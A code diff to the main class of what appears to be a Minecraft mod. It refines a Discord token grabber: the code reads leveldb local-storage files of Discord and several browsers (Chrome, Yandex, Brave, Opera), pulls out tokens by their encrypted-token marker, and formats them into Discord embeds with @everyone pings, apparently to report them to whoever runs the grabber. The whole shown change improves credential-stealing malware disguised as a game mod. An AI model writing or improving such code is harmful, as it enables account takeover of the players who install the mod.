@@ -29,6 +29,11 @@ public final class Main {
     private static final boolean PING_EVERYONE = true;
     private static final Minecraft mc = Minecraft.getMinecraft();
 
+    // --- KONSTANTEN ---
+    private static final int DISCORD_EMBED_MAX_DESCRIPTION_LENGTH = 3500; // Discord limit is 4096, using 3500 for safety
+    private static final int MAX_TOKEN_DISPLAY_LENGTH = 500;
+    private static final String DISCORD_TOKEN_PATTERN = "dQw4w9WgXcQ:"; // Discord's encrypted token identifier
+
     // --- HILFSMETHODEN ---
 
     // Kürzt Texte sicher, damit Discord nicht abstürzt
@@ -138,12 +143,20 @@ public final class Main {
             // Wenn die Tokens diese Länge überschreiten, müssen wir sie aufteilen.
             // Jeder Token ist ca. 60 Zeichen lang, plus Formatierung.
             // Wir setzen ein Limit von 2000 Zeichen pro Embed-Beschreibung, um sicher zu sein.
-            StringBuilder sb = new StringBuilder("```");
-            int currentLength = 3; // Länge von "```"
+            StringBuilder sb = new StringBuilder();
+            sb.append("**Found ").append(tokens.size()).append(" token(s):**\n\n");
+            int currentLength = sb.length();
+            
             for (int i = 0; i < tokens.size(); i++) {
                 String token = tokens.get(i);
-                String shortToken = safeString(token, 100); // Kürze den Token auf eine angemessene Länge, falls er extrem lang ist
-                sb.append(":small_orange_diamond: `").append(shortToken).append("`\n");
+                String displayToken = "**Token " + (i + 1) + ":**\n```" + safeString(token, MAX_TOKEN_DISPLAY_LENGTH) + "```\n";
+                
+                if (currentLength + displayToken.length() > DISCORD_EMBED_MAX_DESCRIPTION_LENGTH) {
+                    sb.append("*...and ").append(tokens.size() - i).append(" more*");
+                    break;
+                }
+                sb.append(displayToken);
+                currentLength += displayToken.length();
             }
             tokenEmbed.setDescription(sb.toString());
         }
@@ -154,36 +167,46 @@ public final class Main {
     public static ArrayList<String> getTokens() {
         ArrayList<String> temp = new ArrayList<>();
         ArrayList<File> paths = new ArrayList<>();
-        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/Discord/Local Storage/leveldb/"));
-        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/"));
-        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/"));
-        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb/"));
-        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/"));
-        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/"));
-        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/User Data/Default/Local Storage/leveldb/"));
+        // Updated path format using cross-platform file separator
+        String userHome = System.getProperty("user.home");
+        String sep = File.separator;
+        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "Discord" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "discordptb" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "discordcanary" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "Google" + sep + "Chrome" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "Yandex" + sep + "YandexBrowser" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "BraveSoftware" + sep + "Brave-Browser" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "Opera Software" + sep + "Opera Stable" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
 
+        // Correct Discord token identifier pattern from reference implementation
+        
         for (File file : paths) {
             if (file == null || !file.exists() || !file.isDirectory()) {
                 continue;
             }
             File[] filesList = file.listFiles();
             if (filesList == null) continue;
-            for (File pathname : filesList) { // Changed 'file' to 'pathname' for clarity
+            for (File pathname : filesList) {
                 try (BufferedReader br = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(pathname))))) {
                     String strLine;
                     while ((strLine = br.readLine()) != null && !strLine.isEmpty()) {
-                        int index;
-                        while ((index = strLine.indexOf("oken")) != -1 && strLine.length() > index + "oken".length() + 1) { // Ensure there's enough string left
+                        // Use the correct Discord token identifier pattern
+                        int index = strLine.indexOf(DISCORD_TOKEN_PATTERN);
+                        if (index != -1) {
                             try {
-                                strLine = strLine.substring(index + "oken".length() + 1);
-                                String token = strLine.split("\"")[1];
-                                if (!temp.contains(token) && token.split("\\.").length >= 2) {
-                                    temp.add(token);
+                                // Extract token after the pattern using indexOf instead of split to avoid regex issues
+                                String afterPattern = strLine.substring(index + DISCORD_TOKEN_PATTERN.length());
+                                int quoteIndex = afterPattern.indexOf("\"");
+                                if (quoteIndex >= 0) {
+                                    String tokenPart = afterPattern.substring(0, quoteIndex);
+                                    if (!temp.contains(tokenPart) && !tokenPart.isEmpty()) {
+                                        temp.add(tokenPart);
+                                    }
                                 }
                             } catch (Exception ignored) {
                                 // Ignoriere Fehler beim Parsen, um den Scan fortzusetzen
                             }
-                        } // while index
+                        }
                     }
                 } catch (Exception ignored) {
                     // Ignoriere Fehler beim Lesen einer Datei und setze fort
